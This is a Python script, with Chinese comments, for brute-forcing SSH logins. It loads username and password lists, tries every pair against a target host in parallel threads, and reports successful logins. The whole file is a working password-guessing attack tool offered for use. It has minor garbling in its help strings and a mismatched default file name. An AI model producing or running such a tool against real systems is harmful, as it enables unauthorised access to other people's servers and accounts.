import argparse
import paramiko
import threading
import time
import concurrent.futures

#假设你有默认的用户名和密码字典文件路径,这里只是示例
DEFAULT_USERNAME_FILE = 'default usernames.txt'
DEFAULT_PASSWORD_FILE = 'default_passwords.txt'

def ssh_login(ip, port, username, password, delay):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port, username, password, timeout=5)
        print(f"Successfully logged in to {ip}:{port} with user {username}")
    except paramiko.AuthenticationException:
        print(f"Authentication failed for user {username} on {ip}:{port}")
    except Exception as e:
        print(f"Error connecting to {ip}:{port}: {e}")
    finally:
        ssh.close()
        time.sleep(delay)#等待一段时间再进行下一次尝试

def worker(args):    
    ssh_login(*args)

def main():
    parser = argparse.ArgumentParser(description='SSH Login Tool')
    parser.add_argument('ip', type=str, help='IP address to connect to')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (ult: 22)')
    parser.add_argument('-u', '--user-file', type=str, default=DEFAULT_USERNAME_FILE, help='File containing usernames to try (default:default_usernames.txt)')
    parser.add_argument('-d', '--password-file', type=str, default=DEFAULT_PASSWORD_FILE,help='File containing passwords to try (default:default_passwords.txt)')
    parser.add_argument('-m', '--threads', type=int, default=10, help='Number threads to use (default: 10)')
    parser.add_argument('-t', '--delay', type=float, default=0.5, help= 'Delay ben login attempts (default. 0.5 seconds)')
    args = parser.parse_args()
    
    # 读取用户名和密码列表
    with open(args.user_file, 'r') as user_file, open(args.password_file, 'r') as password_file:
        usernames = user_file.read().splitlines()
        passwords = password_file.read().splitlines()
        
    #创建一个任务列表
    tasks = [(args.ip, args.port, username, password, args.delay) for username in usernames for password in passwords]

    #使用线程池执行任务
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        for task in tasks:
            executor.submit(worker, task)

if __name__ == "__main__":
    main()
